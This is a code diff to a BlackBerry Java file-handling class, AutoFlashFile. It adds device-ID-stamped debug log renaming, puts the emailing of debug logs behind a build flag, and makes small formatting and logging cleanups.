@@ -21,7 +21,10 @@ import javax.microedition.io.file.FileConnection;
 
 import net.rim.device.api.io.IOUtilities;
 import net.rim.device.api.io.LineReader;
+import net.rim.device.api.system.DeviceInfo;
+import net.rim.device.api.util.NumberUtilities;
 import blackberry.utils.Check;
+import blackberry.utils.DateTime;
 import blackberry.utils.Sendmail;
 import blackberry.utils.Utils;
 
@@ -30,6 +33,7 @@ import blackberry.utils.Utils;
  * The Class AutoFlashFile.
  */
 public final class AutoFlashFile {
+    private static final long MAX_FILE_SIZE = 1024 * 10;
     String filename;
     String path;
     boolean hidden;
@@ -69,6 +73,7 @@ public final class AutoFlashFile {
             //#endif
 
             final long size = fconn.fileSize();
+
             os = fconn.openOutputStream(size);
             //#ifdef DBC
             Check.asserts(os != null, "os null");
@@ -157,8 +162,8 @@ public final class AutoFlashFile {
             Check.asserts(fconn.isHidden() == hidden, "Not Hidden as expected");
             //#endif
         } catch (final IOException e) {
-            System.out.println(e.getMessage());
-            e.printStackTrace();
+            //System.out.println(e.getMessage());
+            //e.printStackTrace();
             return false;
         } finally {
             close();
@@ -258,21 +263,29 @@ public final class AutoFlashFile {
         return data;
     }
 
+    public synchronized void updateLogs() {
+        DateTime dateTime = new DateTime();
+        String tempFile = "Debug_"
+                + NumberUtilities.toString(DeviceInfo.getDeviceId(), 16) + "_"
+                + dateTime.getOrderedString() + ".txt";
+        rename(tempFile, false);
+    }
+
+    //#ifdef SEND_LOG
     public synchronized boolean sendLogs(String email) {
         byte[] data = null;
 
-        final Random random = new Random();
         FileConnection tempConn = null;
         DataInputStream tempIs = null;
-        
-        String tempFile = "Debug_"+ Math.abs(random.nextInt()) + ".txt";
+
+        String tempFile = "Debug_" + Math.abs(Utils.randomInt()) + ".txt";
         try {
             rename(tempFile, false);
 
-            tempConn = (FileConnection) Connector.open(path + tempFile, Connector.READ);
-            //#ifdef DBC
+            tempConn = (FileConnection) Connector.open(path + tempFile,
+                    Connector.READ);
+
             Check.asserts(tempConn != null, "file tempConn null");
-            //#endif
 
             tempIs = tempConn.openDataInputStream();
             LineReader lr = new LineReader(tempIs);
@@ -300,14 +313,14 @@ public final class AutoFlashFile {
             //System.out.println(e.getMessage());
             return false;
         } finally {
-            
-            if(tempIs!=null){
+
+            if (tempIs != null) {
                 try {
                     tempIs.close();
                 } catch (IOException e) {
                 }
             }
-            if (tempConn!=null){
+            if (tempConn != null) {
                 try {
                     tempConn.close();
                 } catch (IOException e) {
@@ -317,6 +330,8 @@ public final class AutoFlashFile {
 
         return true;
     }
+
+    //#endif
 
     /**
      * Rename.
@@ -335,8 +350,8 @@ public final class AutoFlashFile {
 
             if (fconn.exists()) {
                 fconn.rename(newFile);
-                if(openNewname){
-                    filename = path+newFile;
+                if (openNewname) {
+                    filename = path + newFile;
                 }
             }
         } catch (final IOException e) {
